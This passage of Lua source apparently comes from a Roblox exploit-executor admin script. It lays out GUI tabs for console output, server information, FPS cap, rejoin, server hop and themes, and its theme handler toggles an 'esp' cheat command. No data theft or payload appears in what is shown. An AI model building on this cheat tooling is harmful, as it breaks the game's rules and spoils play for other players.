uwu["output scrolling frame"].Position = UDim2.new(0, 4, 0, 55)
uwu["output scrolling frame"].BackgroundColor3 = uwu["default background color"]
uwu["output scrolling frame"].BorderColor3 = uwu["default border color"]
uwu["output scrolling frame"].BorderSizePixel = 1
uwu["output scrolling frame"].ScrollBarThickness = 8
uwu["output scrolling frame"].ScrollBarImageColor3 = uwu["default 1/2 color"]
uwu["output scrolling frame"].CanvasSize = UDim2.new(0, 0, 0, 0)
uwu["output scrolling frame"].Parent = uwu["main frame 2"]
uwu["output scrolling frame"].ZIndex = 24
uwu["output scrolling frame"].Visible = false
uwu["output scrolling frame"].ScrollingDirection = Enum.ScrollingDirection.XY

uwu["output textbox"].Name = "temphalf"
uwu["output textbox"].Size = UDim2.new(0, 393, 0, 164)
uwu["output textbox"].Position = UDim2.new(0, 0, 0, 0)
uwu["output textbox"].BackgroundColor3 = uwu["default background color"]
uwu["output textbox"].BorderColor3 = uwu["default border color"]
uwu["output textbox"].BorderSizePixel = 0
uwu["output textbox"].TextColor3 = uwu["default border color"]
uwu["output textbox"].PlaceholderText = "output from the roblox console will appear here"
uwu["output textbox"].PlaceholderColor3 = uwu["default 1/2 color"]
uwu["output textbox"].Font = Enum.Font.RobotoMono
uwu["output textbox"].TextSize = 15
uwu["output textbox"].TextScaled = false
uwu["output textbox"].Text = ""
uwu["output textbox"].TextXAlignment = Enum.TextXAlignment.Left
uwu["output textbox"].TextYAlignment = Enum.TextYAlignment.Top
uwu["output textbox"].ClearTextOnFocus = false
uwu["output textbox"].MultiLine = true
uwu["output textbox"].Parent = uwu["output scrolling frame"]
uwu["output textbox"].ZIndex = 24
uwu["output textbox"].TextEditable = false

uwu["output textbox text padding"] = Instance.new("UIPadding")
uwu["output textbox text padding"].PaddingLeft = UDim.new(0, 4)
uwu["output textbox text padding"].PaddingTop = UDim.new(0, 4)
uwu["output textbox text padding"].PaddingBottom = UDim.new(0, 4)
uwu["output textbox text padding"].Parent = uwu["output scrolling frame"]

local function addTextWithNewline2(textBox, text)
	local serverTime = os.date("%X")

	if textBox.Text == "" then
		textBox.Text = "[" .. serverTime .. "] " .. text
	else
		textBox.Text = textBox.Text .. "\n[" .. serverTime .. "] " .. text
	end

	updateCanvas3()
end

function updateCanvas3()
	local textBounds = uwu["output textbox"].TextBounds

	uwu["output textbox"].Size = UDim2.new(0, math.max(392, textBounds.X + 20), 0, math.max(164, textBounds.Y + 20))
	uwu["output scrolling frame"].CanvasSize = UDim2.new(0, textBounds.X + 20, 0, textBounds.Y + 11)

	uwu["output scrolling frame"].CanvasPosition = Vector2.new(0, uwu["output scrolling frame"].CanvasSize.Y.Offset)
end

uwu["logs textbox"]:GetPropertyChangedSignal("Text"):Connect(updateCanvas3)

updateCanvas3()

local logcd = false

game:GetService("LogService").MessageOut:Connect(function(message, messageType)
	if logcd then return end 
	logcd = true
	addTextWithNewline2(uwu["output textbox"], message)
	updateCanvas3()
	task.delay(5, function() logcd = false end)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["clear console button"].Size = UDim2.new(0, 393, 0, 45)
uwu["clear console button"].Position = UDim2.new(0, 4, 0, 200)

uwu["clear console button"].BackgroundColor3 = uwu["default background color"]

uwu["clear console button"].BorderColor3 = uwu["default border color"]
uwu["clear console button"].BorderSizePixel = 1

uwu["clear console button"].TextColor3 = uwu["default border color"]
uwu["clear console button"].Font = Enum.Font.RobotoMono
uwu["clear console button"].TextSize = 15
uwu["clear console button"].TextScaled = false
uwu["clear console button"].Text = "clear"
uwu["clear console button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["clear console button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["clear console button text padding"] = Instance.new("UIPadding")
uwu["clear console button text padding"].PaddingLeft = UDim.new(0, 0)
uwu["clear console button text padding"].Parent = uwu["clear console button"]

uwu["clear console button"].Parent = uwu["main frame 2"]
uwu["clear console button"].ZIndex = 24
uwu["clear console button"].Visible = false

uwu["clear console button"].MouseButton1Click:Connect(function()
	playclicksound()
	uwu["output textbox"].Text = ""
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["console label"].Size = UDim2.new(0, 393, 0, 19)
uwu["console label"].Position = UDim2.new(0, 0, 0, 0)
uwu["console label"].TextColor3 = uwu["default border color"]
uwu["console label"].Font = Enum.Font.RobotoMono
uwu["console label"].TextScaled = false
uwu["console label"].TextSize = 15
uwu["console label"].Text = "console (/console) output"
uwu["console label"].TextXAlignment = Enum.TextXAlignment.Center
uwu["console label"].TextYAlignment = Enum.TextYAlignment.Center
uwu["console label"].BackgroundColor3 = uwu["default background color"]
uwu["console label"].BorderColor3 = uwu["default border color"]
uwu["console label"].BorderSizePixel = 1
uwu["console label"].Parent = uwu["output holder"]
uwu["console label"].ZIndex = 24

uwu["console label text padding"] = Instance.new("UIPadding")
uwu["console label text padding"].PaddingBottom = UDim.new(0, 1)
uwu["console label text padding"].Parent = uwu["console label"]

-------------------------------------------------------------------------------------------------------------------------------

uwu["console output tab"].Size = UDim2.new(0, 133, 0, 26)
uwu["console output tab"].Position = UDim2.new(0, 268, 0, 0)

uwu["console output tab"].BackgroundColor3 = uwu["default background color"]
uwu["console output tab"].BorderColor3 = uwu["default border color"]
uwu["console output tab"].BorderSizePixel = 1

uwu["console output tab"].TextColor3 = uwu["default border color"]
uwu["console output tab"].Font = Enum.Font.RobotoMono
uwu["console output tab"].TextSize = 15
uwu["console output tab"].TextScaled = false
uwu["console output tab"].Text = "console output"
uwu["console output tab"].TextXAlignment = Enum.TextXAlignment.Center
uwu["console output tab"].TextYAlignment = Enum.TextYAlignment.Center

uwu["console output tab text padding"] = Instance.new("UIPadding")
uwu["console output tab text padding"].PaddingLeft = UDim.new(0, 0)
uwu["console output tab text padding"].Parent = uwu["scripts tab"]

uwu["console output tab"].Parent = uwu["main frame 2"]
uwu["console output tab"].ZIndex = 21

uwu["console output tab bottom cover"].Size = UDim2.new(0, 133, 0, 2)
uwu["console output tab bottom cover"].Position = UDim2.new(0, 268, 0, 26)
uwu["console output tab bottom cover"].BackgroundColor3 = uwu["default background color"]
uwu["console output tab bottom cover"].BorderSizePixel = 0
uwu["console output tab bottom cover"].Parent = uwu["main frame 2"]
uwu["console output tab bottom cover"].ZIndex = 21.5
uwu["console output tab bottom cover"].Visible = false

uwu["console output tab"].MouseButton1Click:Connect(function()
	playclicksound()

	uwu["player information tab bottom cover"].Visible = false
	uwu["server information tab bottom cover"].Visible = false
	uwu["console output tab bottom cover"].Visible = true

	uwu["information holder"].Visible = false
	uwu["server information holder"].Visible = false
	uwu["output holder"].Visible = true
	uwu["output scrolling frame"].Visible = true
	uwu["console label"].Visible = true
	uwu["clear console button"].Visible = true
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["information holder"].Size = UDim2.new(0, 393, 0, 214)
uwu["information holder"].Position = UDim2.new(0, 4, 0, 31)
uwu["information holder"].BackgroundColor3 = uwu["default background color"]
uwu["information holder"].BorderColor3 = uwu["default border color"]
uwu["information holder"].BorderSizePixel = 1
uwu["information holder"].Parent = uwu["main frame 2"]
uwu["information holder"].ZIndex = 19
uwu["information holder"].Visible = true

uwu["information holder"].TextColor3 = uwu["default border color"]
uwu["information holder"].Font = Enum.Font.RobotoMono
uwu["information holder"].TextSize = 15
uwu["information holder"].TextScaled = false
uwu["information holder"].Text = "loading..."
uwu["information holder"].TextXAlignment = Enum.TextXAlignment.Left
uwu["information holder"].TextYAlignment = Enum.TextYAlignment.Top
uwu["information holder"].ZIndex = 21
uwu["information holder"].TextWrapped = true

uwu["information holder text padding"] = Instance.new("UIPadding")
uwu["information holder text padding"].PaddingLeft = UDim.new(0, 4)
uwu["information holder text padding"].PaddingTop = UDim.new(0, 4)
uwu["information holder text padding"].PaddingBottom = UDim.new(0, 4)
uwu["information holder text padding"].Parent = uwu["information holder"]

-------------------------------------------------------------------------------------------------------------------------------

uwu["server information holder"].Size = UDim2.new(0, 393, 0, 214)
uwu["server information holder"].Position = UDim2.new(0, 4, 0, 31)
uwu["server information holder"].BackgroundColor3 = uwu["default background color"]
uwu["server information holder"].BorderColor3 = uwu["default border color"]
uwu["server information holder"].BorderSizePixel = 1
uwu["server information holder"].Parent = uwu["main frame 2"]
uwu["server information holder"].ZIndex = 19
uwu["server information holder"].Visible = false

uwu["server information holder"].TextColor3 = uwu["default border color"]
uwu["server information holder"].Font = Enum.Font.RobotoMono
uwu["server information holder"].TextSize = 15
uwu["server information holder"].TextScaled = false
uwu["server information holder"].Text = "loading..."
uwu["server information holder"].TextXAlignment = Enum.TextXAlignment.Left
uwu["server information holder"].TextYAlignment = Enum.TextYAlignment.Top
uwu["server information holder"].ZIndex = 21
uwu["server information holder"].TextWrapped = true

uwu["server information holder text padding"] = Instance.new("UIPadding")
uwu["server information holder text padding"].PaddingLeft = UDim.new(0, 4)
uwu["server information holder text padding"].PaddingTop = UDim.new(0, 4)
uwu["server information holder text padding"].PaddingBottom = UDim.new(0, 4)
uwu["server information holder text padding"].Parent = uwu["server information holder"]

-------------------------------------------------------------------------------------------------------------------------------

uwu["script settings tab"].Size = UDim2.new(0, 199, 0, 26)
uwu["script settings tab"].Position = UDim2.new(0, 0, 0, 0)

uwu["script settings tab"].BackgroundColor3 = uwu["default background color"]

uwu["script settings tab"].BorderColor3 = uwu["default border color"]
uwu["script settings tab"].BorderSizePixel = 1

uwu["script settings tab"].TextColor3 = uwu["default border color"]
uwu["script settings tab"].Font = Enum.Font.RobotoMono
uwu["script settings tab"].TextSize = 15
uwu["script settings tab"].TextScaled = false
uwu["script settings tab"].Text = "script settings"
uwu["script settings tab"].TextXAlignment = Enum.TextXAlignment.Center
uwu["script settings tab"].TextYAlignment = Enum.TextYAlignment.Center

uwu["script settings tab text padding"] = Instance.new("UIPadding")
uwu["script settings tab text padding"].PaddingLeft = UDim.new(0, 0)
uwu["script settings tab text padding"].Parent = uwu["scripts tab"]

uwu["script settings tab"].Parent = uwu["main frame 3"]
uwu["script settings tab"].ZIndex = 23

uwu["script settings tab bottom cover"].Size = UDim2.new(0, 199, 0, 2)
uwu["script settings tab bottom cover"].Position = UDim2.new(0, 0, 0, 26)
uwu["script settings tab bottom cover"].BackgroundColor3 = uwu["default background color"]
uwu["script settings tab bottom cover"].BorderSizePixel = 0
uwu["script settings tab bottom cover"].Parent = uwu["main frame 3"]
uwu["script settings tab bottom cover"].ZIndex = 23.5
uwu["script settings tab bottom cover"].Visible = true

uwu["script settings tab"].MouseButton1Click:Connect(function()
	playclicksound()

	uwu["script settings tab bottom cover"].Visible = true
	uwu["server settings tab bottom cover"].Visible = false

	uwu["server settings holder"].Visible = false
	uwu["script settings holder"].Visible = true
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["server settings tab"].Size = UDim2.new(0, 201, 0, 26)
uwu["server settings tab"].Position = UDim2.new(0, 200, 0, 0)

uwu["server settings tab"].BackgroundColor3 = uwu["default background color"]

uwu["server settings tab"].BorderColor3 = uwu["default border color"]
uwu["server settings tab"].BorderSizePixel = 1

uwu["server settings tab"].TextColor3 = uwu["default border color"]
uwu["server settings tab"].Font = Enum.Font.RobotoMono
uwu["server settings tab"].TextSize = 15
uwu["server settings tab"].TextScaled = false
uwu["server settings tab"].Text = "server settings"
uwu["server settings tab"].TextXAlignment = Enum.TextXAlignment.Center
uwu["server settings tab"].TextYAlignment = Enum.TextYAlignment.Center

uwu["server settings tab text padding"] = Instance.new("UIPadding")
uwu["server settings tab text padding"].PaddingLeft = UDim.new(0, 0)
uwu["server settings tab text padding"].Parent = uwu["scripts tab"]

uwu["server settings tab"].Parent = uwu["main frame 3"]
uwu["server settings tab"].ZIndex = 23

uwu["server settings tab bottom cover"].Size = UDim2.new(0, 201, 0, 2)
uwu["server settings tab bottom cover"].Position = UDim2.new(0, 200, 0, 26)
uwu["server settings tab bottom cover"].BackgroundColor3 = uwu["default background color"]
uwu["server settings tab bottom cover"].BorderSizePixel = 0
uwu["server settings tab bottom cover"].Parent = uwu["main frame 3"]
uwu["server settings tab bottom cover"].ZIndex = 23.5
uwu["server settings tab bottom cover"].Visible = false

uwu["server settings tab"].MouseButton1Click:Connect(function()
	playclicksound()

	uwu["script settings tab bottom cover"].Visible = false
	uwu["server settings tab bottom cover"].Visible = true

	uwu["server settings holder"].Visible = true
	uwu["script settings holder"].Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["server settings holder"].Size = UDim2.new(0, 393, 0, 214)
uwu["server settings holder"].Position = UDim2.new(0, 4, 0, 31)
uwu["server settings holder"].BackgroundColor3 = uwu["default background color"]
uwu["server settings holder"].BorderColor3 = uwu["default border color"]
uwu["server settings holder"].BackgroundTransparency = 1
uwu["server settings holder"].Parent = uwu["main frame 3"]
uwu["server settings holder"].Visible = false
uwu["server settings holder"].ZIndex = 23

-------------------------------------------------------------------------------------------------------------------------------

uwu["change fps cap"].Size = UDim2.new(0, 230, 0, 68)
uwu["change fps cap"].Position = UDim2.new(0, 0, 0, 0)
uwu["change fps cap"].TextColor3 = uwu["default border color"]
uwu["change fps cap"].Font = Enum.Font.RobotoMono
uwu["change fps cap"].TextScaled = false
uwu["change fps cap"].TextSize = 15
uwu["change fps cap"].Text = "fps cap: 120"
uwu["change fps cap"].TextXAlignment = Enum.TextXAlignment.Center
uwu["change fps cap"].TextYAlignment = Enum.TextYAlignment.Center
uwu["change fps cap"].BackgroundColor3 = uwu["default background color"]
uwu["change fps cap"].BorderColor3 = uwu["default border color"]
uwu["change fps cap"].BorderSizePixel = 1
uwu["change fps cap"].Parent = uwu["server settings holder"]
uwu["change fps cap"].ZIndex = 24

uwu["change fps cap setting"].Size = UDim2.new(0, 158, 0, 31)
uwu["change fps cap setting"].Position = UDim2.new(0, 235, 0, 0)
uwu["change fps cap setting"].TextColor3 = uwu["default border color"]
uwu["change fps cap setting"].Font = Enum.Font.RobotoMono
uwu["change fps cap setting"].TextScaled = false
uwu["change fps cap setting"].TextSize = 15
uwu["change fps cap setting"].Text = "change fps cap"
uwu["change fps cap setting"].TextXAlignment = Enum.TextXAlignment.Center
uwu["change fps cap setting"].TextYAlignment = Enum.TextYAlignment.Center
uwu["change fps cap setting"].BackgroundColor3 = uwu["default background color"]
uwu["change fps cap setting"].BorderColor3 = uwu["default border color"]
uwu["change fps cap setting"].BorderSizePixel = 1
uwu["change fps cap setting"].Parent = uwu["server settings holder"]
uwu["change fps cap setting"].ZIndex = 24

uwu["change fps cap textbox"].Size = UDim2.new(0, 158, 0, 32)
uwu["change fps cap textbox"].Position = UDim2.new(0, 235, 0, 36)
uwu["change fps cap textbox"].TextColor3 = uwu["default border color"]
uwu["change fps cap textbox"].Font = Enum.Font.RobotoMono
uwu["change fps cap textbox"].TextScaled = false
uwu["change fps cap textbox"].TextSize = 15
uwu["change fps cap textbox"].Text = ""
uwu["change fps cap textbox"].PlaceholderText = "enter value here"
uwu["change fps cap textbox"].PlaceholderColor3 = uwu["default 1/2 color"]
uwu["change fps cap textbox"].TextXAlignment = Enum.TextXAlignment.Center
uwu["change fps cap textbox"].TextYAlignment = Enum.TextYAlignment.Center
uwu["change fps cap textbox"].BackgroundColor3 = uwu["default background color"]
uwu["change fps cap textbox"].BorderColor3 = uwu["default border color"]
uwu["change fps cap textbox"].BorderSizePixel = 1
uwu["change fps cap textbox"].Parent = uwu["server settings holder"]
uwu["change fps cap textbox"].ZIndex = 24

uwu["change fps cap setting"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	local fpscap = tonumber(uwu["change fps cap textbox"].Text)
	if fpscap and fpscap ~= "" then
		fpscap = math.clamp(fpscap, 1, 240)
		uwu["change fps cap"].Text = "fps cap: " .. fpscap
		if setfpscap then setfpscap(fpscap) end
	end
	uwu["change fps cap textbox"].Text = ""
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["rejoin server"].Size = UDim2.new(0, 128, 0, 68)
uwu["rejoin server"].Position = UDim2.new(0, 0, 0, 73)
uwu["rejoin server"].TextColor3 = uwu["default border color"]
uwu["rejoin server"].Font = Enum.Font.RobotoMono
uwu["rejoin server"].TextScaled = false
uwu["rejoin server"].TextSize = 15
uwu["rejoin server"].Text = "rejoin server"
uwu["rejoin server"].TextXAlignment = Enum.TextXAlignment.Center
uwu["rejoin server"].TextYAlignment = Enum.TextYAlignment.Center
uwu["rejoin server"].BackgroundColor3 = uwu["default background color"]
uwu["rejoin server"].BorderColor3 = uwu["default border color"]
uwu["rejoin server"].BorderSizePixel = 1
uwu["rejoin server"].Parent = uwu["server settings holder"]
uwu["rejoin server"].ZIndex = 24

uwu["rejoin server"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	if #uwu["players"]:GetPlayers() <= 1 then
		uwu["players"].LocalPlayer:Kick("rejoining -.-")
		t()
		uwu["teleport service"]:Teleport(getPlaceId(), uwu["players"].LocalPlayer)
	else
		uwu["teleport service"]:TeleportToPlaceInstance(getPlaceId(), getJobId(), uwu["players"].LocalPlayer)
	end
end)

uwu["leave game"].Size = UDim2.new(0, 127, 0, 68)
uwu["leave game"].Position = UDim2.new(0, 133, 0, 73)
uwu["leave game"].TextColor3 = uwu["default border color"]
uwu["leave game"].Font = Enum.Font.RobotoMono
uwu["leave game"].TextScaled = false
uwu["leave game"].TextSize = 15
uwu["leave game"].Text = "leave game"
uwu["leave game"].TextXAlignment = Enum.TextXAlignment.Center
uwu["leave game"].TextYAlignment = Enum.TextYAlignment.Center
uwu["leave game"].BackgroundColor3 = uwu["default background color"]
uwu["leave game"].BorderColor3 = uwu["default border color"]
uwu["leave game"].BorderSizePixel = 1
uwu["leave game"].Parent = uwu["server settings holder"]
uwu["leave game"].ZIndex = 24

uwu["leave game"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	game:Shutdown()
end)

uwu["server hop"].Size = UDim2.new(0, 128, 0, 68)
uwu["server hop"].Position = UDim2.new(0, 265, 0, 73)
uwu["server hop"].TextColor3 = uwu["default border color"]
uwu["server hop"].Font = Enum.Font.RobotoMono
uwu["server hop"].TextScaled = false
uwu["server hop"].TextSize = 15
uwu["server hop"].Text = "server hop"
uwu["server hop"].TextXAlignment = Enum.TextXAlignment.Center
uwu["server hop"].TextYAlignment = Enum.TextYAlignment.Center
uwu["server hop"].BackgroundColor3 = uwu["default background color"]
uwu["server hop"].BorderColor3 = uwu["default border color"]
uwu["server hop"].BorderSizePixel = 1
uwu["server hop"].Parent = uwu["server settings holder"]
uwu["server hop"].ZIndex = 24

uwu["server hop"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	if httprequest then
		local servers = {}
		local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", getPlaceId())})
		local body = HttpService:JSONDecode(req.Body)

		if body and body.data then
			for i, v in next, body.data do
				if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
					table.insert(servers, 1, v.id)
				end
			end
		end

		if #servers > 0 then
			uwu["teleport service"]:TeleportToPlaceInstance(getPlaceId(), servers[math.random(1, #servers)], uwu["players"].LocalPlayer)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["auto rejoin toggle"].Size = UDim2.new(0, 230, 0, 68)
uwu["auto rejoin toggle"].Position = UDim2.new(0, 0, 0, 146)
uwu["auto rejoin toggle"].TextColor3 = uwu["default border color"]
uwu["auto rejoin toggle"].Font = Enum.Font.RobotoMono
uwu["auto rejoin toggle"].TextScaled = false
uwu["auto rejoin toggle"].TextSize = 15
uwu["auto rejoin toggle"].Text = "auto rejoin: disabled"
uwu["auto rejoin toggle"].TextXAlignment = Enum.TextXAlignment.Center
uwu["auto rejoin toggle"].TextYAlignment = Enum.TextYAlignment.Center
uwu["auto rejoin toggle"].BackgroundColor3 = uwu["default background color"]
uwu["auto rejoin toggle"].BorderColor3 = uwu["default border color"]
uwu["auto rejoin toggle"].BorderSizePixel = 1
uwu["auto rejoin toggle"].Parent = uwu["server settings holder"]
uwu["auto rejoin toggle"].ZIndex = 24

uwu["toggle auto rejoin on"].Size = UDim2.new(0, 158, 0, 31)
uwu["toggle auto rejoin on"].Position = UDim2.new(0, 235, 0, 146)
uwu["toggle auto rejoin on"].TextColor3 = uwu["default border color"]
uwu["toggle auto rejoin on"].Font = Enum.Font.RobotoMono
uwu["toggle auto rejoin on"].TextScaled = false
uwu["toggle auto rejoin on"].TextSize = 15
uwu["toggle auto rejoin on"].Text = "enable"
uwu["toggle auto rejoin on"].TextXAlignment = Enum.TextXAlignment.Center
uwu["toggle auto rejoin on"].TextYAlignment = Enum.TextYAlignment.Center
uwu["toggle auto rejoin on"].BackgroundColor3 = uwu["default background color"]
uwu["toggle auto rejoin on"].BorderColor3 = uwu["default border color"]
uwu["toggle auto rejoin on"].BorderSizePixel = 1
uwu["toggle auto rejoin on"].Parent = uwu["server settings holder"]
uwu["toggle auto rejoin on"].ZIndex = 24

uwu["toggle auto rejoin off"].Size = UDim2.new(0, 158, 0, 32)
uwu["toggle auto rejoin off"].Position = UDim2.new(0, 235, 0, 182)
uwu["toggle auto rejoin off"].TextColor3 = uwu["default border color"]
uwu["toggle auto rejoin off"].Font = Enum.Font.RobotoMono
uwu["toggle auto rejoin off"].TextScaled = false
uwu["toggle auto rejoin off"].TextSize = 15
uwu["toggle auto rejoin off"].Text = "disable"
uwu["toggle auto rejoin off"].TextXAlignment = Enum.TextXAlignment.Center
uwu["toggle auto rejoin off"].TextYAlignment = Enum.TextYAlignment.Center
uwu["toggle auto rejoin off"].BackgroundColor3 = uwu["default background color"]
uwu["toggle auto rejoin off"].BorderColor3 = uwu["default border color"]
uwu["toggle auto rejoin off"].BorderSizePixel = 1
uwu["toggle auto rejoin off"].Parent = uwu["server settings holder"]
uwu["toggle auto rejoin off"].ZIndex = 24

arj = false

uwu["toggle auto rejoin on"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	uwu["auto rejoin toggle"].Text = "auto rejoin: enabled"
	arj = true
end)

uwu["toggle auto rejoin off"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	uwu["auto rejoin toggle"].Text = "auto rejoin: disabled"
	arj = false
end)

if not uwu["in studio"] then
	uwu["gui service"].ErrorMessageChanged:Connect(function()
		if arj == false then return end
		uwu["gui service"].ErrorMessageChanged:Connect(function()
			rejoin()
		end)
	end)
end

-------------------------------------------------------------------------------------------------------------------------------

uwu["script settings holder"].Size = UDim2.new(0, 393, 0, 214)
uwu["script settings holder"].Position = UDim2.new(0, 4, 0, 31)
uwu["script settings holder"].BackgroundColor3 = uwu["default background color"]
uwu["script settings holder"].BorderColor3 = uwu["default border color"]
uwu["script settings holder"].BorderSizePixel = 0
uwu["script settings holder"].Parent = uwu["main frame 3"]
uwu["script settings holder"].Visible = true
uwu["script settings holder"].ZIndex = 23

-------------------------------------------------------------------------------------------------------------------------------

uwu["current theme"].Size = UDim2.new(0, 230, 0, 68)
uwu["current theme"].Position = UDim2.new(0, 0, 0, 0)
uwu["current theme"].TextColor3 = uwu["default border color"]
uwu["current theme"].Font = Enum.Font.RobotoMono
uwu["current theme"].TextScaled = false
uwu["current theme"].TextSize = 15
uwu["current theme"].Text = "current theme: default"
uwu["current theme"].TextXAlignment = Enum.TextXAlignment.Center
uwu["current theme"].TextYAlignment = Enum.TextYAlignment.Center
uwu["current theme"].BackgroundColor3 = uwu["default background color"]
uwu["current theme"].BorderColor3 = uwu["default border color"]
uwu["current theme"].BorderSizePixel = 1
uwu["current theme"].Parent = uwu["script settings holder"]
uwu["current theme"].ZIndex = 24

uwu["change theme setting"].Size = UDim2.new(0, 158, 0, 68)
uwu["change theme setting"].Position = UDim2.new(0, 235, 0, 0)
uwu["change theme setting"].TextColor3 = uwu["default border color"]
uwu["change theme setting"].Font = Enum.Font.RobotoMono
uwu["change theme setting"].TextScaled = false
uwu["change theme setting"].TextSize = 15
uwu["change theme setting"].Text = "change theme"
uwu["change theme setting"].TextXAlignment = Enum.TextXAlignment.Center
uwu["change theme setting"].TextYAlignment = Enum.TextYAlignment.Center
uwu["change theme setting"].BackgroundColor3 = uwu["default background color"]
uwu["change theme setting"].BorderColor3 = uwu["default border color"]
uwu["change theme setting"].BorderSizePixel = 1
uwu["change theme setting"].Parent = uwu["script settings holder"]
uwu["change theme setting"].ZIndex = 24

local currenttheme = "default"
local themes = {
	"default",
	"light",
	"grayscale",
	"noxious",
	"c00l",
	"c00l2",
	"polaria",
}

function updthemedisplay()
	uwu["current theme"].Text = "current theme: " .. currenttheme
end

function applytheme(themeName)

	grayscaletheme = false
	noxioustheme = false
	c00ltheme = false
	c00l2theme = false
	lighttheme = false
	polariatheme = false

	if themeName == "light" then
		lighttheme = true
		lightcols()
	elseif themeName == "grayscale" then
		grayscaletheme = true
		grayscalecols()
	elseif themeName == "noxious" then
		noxioustheme = true
		noxiouscols()
	elseif themeName == "c00l2" then
		c00l2theme = true
		c00l2cols()
	elseif themeName == "c00l" then
		c00ltheme = true
		c00lcols()
	elseif themeName == "polaria" then
		polariatheme = true
		polariacols()
	elseif themeName == "default" then
		grayscaletheme = false
		noxioustheme = false
		c00ltheme = false
		c00l2theme = false
		lighttheme = false
		restorecols()
	end

	currenttheme = themeName
	updthemedisplay()
	updcols()
end

function cycleTheme()
	local currentind = 1
	for i, theme in ipairs(themes) do
		if theme == currenttheme then
			currentind = i
			break
		end
	end

	local nextind = currentind % #themes + 1
	applytheme(themes[nextind])
end

uwu["change theme setting"].MouseButton1Click:Connect(function()
	if playclicksound then
		playclicksound()
	end
	cycleTheme()
	if usingesp then
		task.spawn(function() execcmd("unesp") end)
		t(0.5)
		task.spawn(function() execcmd("esp") end)
	end
end)

updthemedisplay()

-------------------------------------------------------------------------------------------------------------------------------

uwu["command prefix"].Size = UDim2.new(0, 230, 0, 68)
uwu["command prefix"].Position = UDim2.new(0, 0, 0, 73)
uwu["command prefix"].TextColor3 = uwu["default border color"]
uwu["command prefix"].Font = Enum.Font.RobotoMono
uwu["command prefix"].TextScaled = false
uwu["command prefix"].TextSize = 15
uwu["command prefix"].Text = "command prefix: ."
uwu["command prefix"].TextXAlignment = Enum.TextXAlignment.Center
uwu["command prefix"].TextYAlignment = Enum.TextYAlignment.Center
uwu["command prefix"].BackgroundColor3 = uwu["default background color"]
uwu["command prefix"].BorderColor3 = uwu["default border color"]
uwu["command prefix"].BorderSizePixel = 1
uwu["command prefix"].Parent = uwu["script settings holder"]
uwu["command prefix"].ZIndex = 24

uwu["change command prefix setting"].Size = UDim2.new(0, 158, 0, 31)
uwu["change command prefix setting"].Position = UDim2.new(0, 235, 0, 73)
uwu["change command prefix setting"].TextColor3 = uwu["default border color"]
uwu["change command prefix setting"].Font = Enum.Font.RobotoMono
uwu["change command prefix setting"].TextScaled = false
uwu["change command prefix setting"].TextSize = 15
uwu["change command prefix setting"].Text = "change prefix"
uwu["change command prefix setting"].TextXAlignment = Enum.TextXAlignment.Center
uwu["change command prefix setting"].TextYAlignment = Enum.TextYAlignment.Center
uwu["change command prefix setting"].BackgroundColor3 = uwu["default background color"]
uwu["change command prefix setting"].BorderColor3 = uwu["default border color"]
uwu["change command prefix setting"].BorderSizePixel = 1
uwu["change command prefix setting"].Parent = uwu["script settings holder"]
uwu["change command prefix setting"].ZIndex = 24

uwu["change command prefix setting"].MouseButton1Click:Connect(function()
	playclicksound()
	local nooprefix = uwu["change command prefix textbox"].Text
	uwu["change command prefix textbox"].Text = ""
	changeprefix(nooprefix)
end)

uwu["change command prefix textbox"].Size = UDim2.new(0, 158, 0, 32)
uwu["change command prefix textbox"].Position = UDim2.new(0, 235, 0, 109)
uwu["change command prefix textbox"].TextColor3 = uwu["default border color"]
uwu["change command prefix textbox"].Font = Enum.Font.RobotoMono
uwu["change command prefix textbox"].TextScaled = false
uwu["change command prefix textbox"].TextSize = 15
uwu["change command prefix textbox"].Text = ""
uwu["change command prefix textbox"].PlaceholderText = "enter prefix here"
uwu["change command prefix textbox"].PlaceholderColor3 = uwu["default 1/2 color"]
uwu["change command prefix textbox"].TextXAlignment = Enum.TextXAlignment.Center
uwu["change command prefix textbox"].TextYAlignment = Enum.TextYAlignment.Center
uwu["change command prefix textbox"].BackgroundColor3 = uwu["default background color"]
uwu["change command prefix textbox"].BorderColor3 = uwu["default border color"]
uwu["change command prefix textbox"].BorderSizePixel = 1
uwu["change command prefix textbox"].Parent = uwu["script settings holder"]
uwu["change command prefix textbox"].ZIndex = 24

-------------------------------------------------------------------------------------------------------------------------------

uwu["change click sound setting"].Size = UDim2.new(0, 230, 0, 68)
uwu["change click sound setting"].Position = UDim2.new(0, 0, 0, 146)
uwu["change click sound setting"].TextColor3 = uwu["default border color"]
uwu["change click sound setting"].Font = Enum.Font.RobotoMono
uwu["change click sound setting"].TextScaled = false
uwu["change click sound setting"].TextSize = 15
uwu["change click sound setting"].Text = "click sound: 226892749"
uwu["change click sound setting"].TextXAlignment = Enum.TextXAlignment.Center
uwu["change click sound setting"].TextYAlignment = Enum.TextYAlignment.Center
uwu["change click sound setting"].BackgroundColor3 = uwu["default background color"]
uwu["change click sound setting"].BorderColor3 = uwu["default border color"]
uwu["change click sound setting"].BorderSizePixel = 1
uwu["change click sound setting"].Parent = uwu["script settings holder"]
uwu["change click sound setting"].ZIndex = 24

uwu["change click sound"].Size = UDim2.new(0, 158, 0, 31)
uwu["change click sound"].Position = UDim2.new(0, 235, 0, 146)
uwu["change click sound"].TextColor3 = uwu["default border color"]
uwu["change click sound"].Font = Enum.Font.RobotoMono
uwu["change click sound"].TextScaled = false
uwu["change click sound"].TextSize = 15
uwu["change click sound"].Text = "change click sound"
uwu["change click sound"].TextXAlignment = Enum.TextXAlignment.Center
uwu["change click sound"].TextYAlignment = Enum.TextYAlignment.Center
